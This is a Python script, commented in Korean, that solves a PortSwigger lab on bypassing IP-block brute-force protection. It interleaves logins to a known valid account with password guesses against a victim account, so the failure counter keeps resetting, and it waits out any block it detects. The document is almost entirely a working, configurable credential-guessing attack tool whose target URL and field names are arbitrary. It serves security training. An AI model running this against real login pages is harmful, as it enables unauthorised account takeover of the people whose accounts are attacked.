#!/usr/bin/env python3
"""
Authentication - Broken Brute-force Protection (IP block) Bypass
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

로직 결함 이용:
  - 실패 로그인 3회 연속 시 IP 가 일시 차단됨
  - 그러나 "성공 로그인" 을 하면 실패 카운터가 리셋됨
  → 후보 password 시도 사이에 자기 계정(정상 자격증명)으로 로그인해
    카운터를 계속 리셋하며 brute-force 를 완료한다.

시도 순서(반복):
  [정상 로그인(wiener:peter) → 후보 로그인(carlos:§pw§)] x N
  → 실패 카운터가 3에 도달하지 않음

기존 툴(14-authentication-brute-force.py)의 목록 로더/세션을 재사용한다.

사용 예시:
  python3 14-authentication-ip-block-bypass.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --valid-username wiener --valid-password peter \\
    --victim carlos --verify
"""

import argparse
import importlib.util
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_BF_PATH = os.path.join(_HERE, "14-authentication-brute-force.py")


def _load_bruteforce():
    spec = importlib.util.spec_from_file_location("auth_bruteforce", _BF_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bf = _load_bruteforce()

BLOCK_MARKERS = ("too many", "blocked", "temporarily")


def is_blocked(resp) -> bool:
    if resp.status_code in (403, 429):
        return True
    low = resp.text.lower()
    return any(m in low for m in BLOCK_MARKERS)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="성공 로그인으로 실패 카운터를 리셋하며 IP 차단 우회 brute-force"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본값: /login)")
    parser.add_argument("--username-field", default="username",
                        help="username 파라미터 이름 (기본값: username)")
    parser.add_argument("--password-field", default="password",
                        help="password 파라미터 이름 (기본값: password)")
    parser.add_argument("--victim", default="carlos",
                        help="공격 대상 username (기본값: carlos)")
    parser.add_argument("--passwords", default=None,
                        help=f"password 목록 (URL/파일/인라인). 기본: {bf.DEFAULT_PASSWORDS}")
    parser.add_argument("--valid-username", default="wiener",
                        help="카운터 리셋용 정상 계정 username (기본값: wiener)")
    parser.add_argument("--valid-password", default="peter",
                        help="카운터 리셋용 정상 계정 password (기본값: peter)")
    parser.add_argument("--pass-fail", default="Incorrect password",
                        help="victim 실패 응답 문자열 (기본: 'Incorrect password')")
    parser.add_argument("--block-wait", type=float, default=61.0,
                        help="차단 감지 시 대기 시간(초) (기본: 61)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="요청 간 지연(초) (기본: 0)")
    parser.add_argument("--session", default=None, help="기존 세션 쿠키 값 (선택)")
    parser.add_argument("--verify", action="store_true",
                        help="자격증명으로 로그인/계정 접근 검증")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증 시 접근할 계정 경로 (기본: /my-account)")
    args = parser.parse_args()

    try:
        passwords = bf.load_wordlist(args.passwords, bf.DEFAULT_PASSWORDS)
    except Exception as e:
        print(f"[-] 목록 로딩 실패: {e}")
        sys.exit(1)

    login = bf.LoginSession(args.target, args.login_path, args.username_field,
                            args.password_field, args.session)

    print(f"[*] 대상        : {args.target}")
    print(f"    victim      : {args.victim}")
    print(f"    reset 계정  : {args.valid_username}:{args.valid_password}")
    print(f"    passwords   : {len(passwords)}개")
    print(f"    CSRF        : {'획득' if login.csrf else '없음'}")
    print(f"\n[*] 시도 순서: [정상 로그인 → victim 후보] 반복")
    print("    " + "-" * 60)

    for i, pw in enumerate(passwords, 1):
        # 1) 정상 로그인으로 실패 카운터 리셋
        try:
            reset_resp = login.attempt(args.valid_username, args.valid_password)
        except Exception as e:  # noqa: BLE001
            print(f"    [{i:>3}] reset 요청 실패: {e}")
            continue
        if reset_resp.status_code not in bf.SUCCESS_CODES:
            if is_blocked(reset_resp):
                print(f"    [{i:>3}] reset 시점에 이미 차단됨 → {args.block_wait}초 대기")
                time.sleep(args.block_wait)
                try:
                    login.attempt(args.valid_username, args.valid_password)
                except Exception:  # noqa: BLE001
                    pass
            else:
                print(f"    [!] reset 로그인 실패 (status={reset_resp.status_code}) — "
                      f"정상 자격증명/필드명 확인 필요")

        # 2) victim 후보 시도
        try:
            resp = login.attempt(args.victim, pw)
        except Exception as e:  # noqa: BLE001
            print(f"    [{i:>3}] {pw:<20} 요청 실패: {e}")
            continue

        if resp.status_code in bf.SUCCESS_CODES:
            print(f"    [{i:>3}] {pw:<20} status={resp.status_code}  <== 성공")
            print(f"\n[+] 자격증명 발견: {args.victim} / {pw}")
            if args.verify:
                bf.verify_login(login, args.victim, pw, args.account_path)
            return

        if is_blocked(resp):
            print(f"    [{i:>3}] {pw:<20} 차단 감지 → {args.block_wait}초 대기 후 재개")
            time.sleep(args.block_wait)
            try:
                login.attempt(args.valid_username, args.valid_password)
                retry = login.attempt(args.victim, pw)
                if retry.status_code in bf.SUCCESS_CODES:
                    print(f"    [{i:>3}] {pw:<20} status={retry.status_code}  <== 성공(재시도)")
                    print(f"\n[+] 자격증명 발견: {args.victim} / {pw}")
                    if args.verify:
                        bf.verify_login(login, args.victim, pw, args.account_path)
                    return
            except Exception:  # noqa: BLE001
                pass
        elif i % 10 == 0 or i == len(passwords):
            print(f"    [{i:>3}/{len(passwords)}] 진행 중... (마지막 victim 시도: {pw})")

        if args.delay:
            time.sleep(args.delay)

    print("\n[-] 목록 내에서 password 를 찾지 못했습니다.")


if __name__ == "__main__":
    main()
